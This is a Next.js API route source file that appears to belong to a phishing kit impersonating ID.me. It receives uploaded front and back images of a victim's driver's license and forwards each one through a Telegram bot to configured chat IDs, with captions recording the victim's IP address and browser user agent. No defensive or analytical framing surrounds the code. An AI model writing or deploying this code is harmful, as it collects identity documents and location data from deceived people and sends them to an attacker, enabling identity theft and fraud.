// app/api/telegram-upload/route.ts
import { NextRequest, NextResponse } from "next/server";
import axios from "axios";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
const CHAT_IDS = (process.env.TELEGRAM_CHAT_IDS || "").split(",");

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    const frontFile = formData.get("front") as File;
    const backFile = formData.get("back") as File;
    const timestamp = formData.get("timestamp") as string;

    if (!frontFile || !backFile) {
      return NextResponse.json({ error: "Missing files" }, { status: 400 });
    }

    // Get client IP and user agent from request headers
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";
    const userAgent = req.headers.get("user-agent") || "unknown";

    const caption = (side: string) =>
      `ID.me Driver's License ${side}\nTime: ${timestamp}\n🌐 IP: ${ip}\n🖥️ ${userAgent}\n📍 Country: (geo lookup optional)`;

    // Send both files to each chat ID
    for (const chatId of CHAT_IDS) {
      // Send front
      const frontForm = new FormData();
      frontForm.append("chat_id", chatId);
      frontForm.append("document", frontFile);
      frontForm.append("caption", caption("Front"));
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, frontForm, {
        headers: { "Content-Type": "multipart/form-data" },
      });

      // Send back
      const backForm = new FormData();
      backForm.append("chat_id", chatId);
      backForm.append("document", backFile);
      backForm.append("caption", caption("Back"));
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, backForm, {
        headers: { "Content-Type": "multipart/form-data" },
      });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Upload error:", error);
    return NextResponse.json({ error: "Upload failed" }, { status: 500 });
  }
}